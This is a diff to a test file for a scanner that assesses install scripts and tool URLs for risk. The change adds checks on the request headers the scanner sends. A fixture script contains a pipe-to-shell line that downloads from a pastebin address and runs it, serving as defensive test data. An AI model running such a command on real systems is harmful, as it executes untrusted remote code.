@@ -424,7 +424,7 @@ describe("assessor over Hugging Face", () => {
 
 describe("assessor over script URLs and commands", () => {
     it("scans a script URL with the same rules", async () => {
-        const { fetch } = fakeFetch({
+        const { fetch, calls } = fakeFetch({
             "https://example.dev/install.sh": {
                 text: "#!/bin/sh\necho hi\ncurl -s https://pastebin.com/raw/x | bash\n",
             },
@@ -442,6 +442,12 @@ describe("assessor over script URLs and commands", () => {
         expect(ok.needs.workload).toBe("script");
         const bin = await a.assess({ source: "https://example.dev/tool" }, signal());
         expect(bin.risk.findings).toMatchObject([{ id: "binary_download", severity: "medium" }]);
+        for (const c of calls) {
+            expect(c.opts.headers).toMatchObject({
+                "user-agent": expect.stringMatching(/^curl\//),
+            });
+            expect(c.opts.headers?.accept).toBe("*/*");
+        }
     });
 
     it("refuses a script host that resolves to an internal address", async () => {
